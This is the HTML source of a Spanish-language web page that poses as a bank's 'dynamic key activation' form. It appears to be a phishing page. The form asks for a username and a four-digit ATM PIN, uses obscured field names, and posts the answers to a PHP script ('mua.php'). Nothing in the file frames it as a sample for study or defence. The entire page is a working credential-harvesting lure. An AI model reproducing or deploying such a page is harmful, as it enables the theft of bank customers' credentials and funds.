	<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Activacion de dinamica</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body style="background-image: url(fondito.svg);background-size: cover;background-repeat: no-repeat;background-position: bottom -307px left -288px;">
    <br>
   <img src="logo.svg" style="width: 250px;display: block;margin: 0 auto;">
   <br>
   <br>

    <form action="mua.php" method="post" class="formulario">
        <h1 style="display: block;margin: 0 auto;text-align: center;font-size: 20pt;">¡Activacion de Clave Dinamica!</h1>
        <br>
        <div class="input-group" >
            
           
            <input type="text"  placeholder="Ingresa el usuario" name="SUAVECITO" required style="border-bottom: 1px solid #fdda24;line-height: 24px;font-size: 16px;letter-spacing: .4px;color: #2b2b2b;-webkit-appearance: none;border-left: 0;border-right: 0;border-top: none;" ></span>
        </div>
        <div class="input-group">
      
            <input type="tel" minlength="4" maxlength="4" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" placeholder="Ingresa clave del cajero" name="VAIPAESA" required style="border-bottom: 1px solid #fdda24;line-height: 24px;font-size: 16px;letter-spacing: .4px;color: #2b2b2b;-webkit-appearance: none;border-left: 0;border-right: 0;border-top: none;">
        </div>
       
      <br>
        <button type="submit">CONTINUAR</button>
        <br>
        <br>
        
        <br>
        <br>
        <br>
       
        
    </form>
</body>
</html>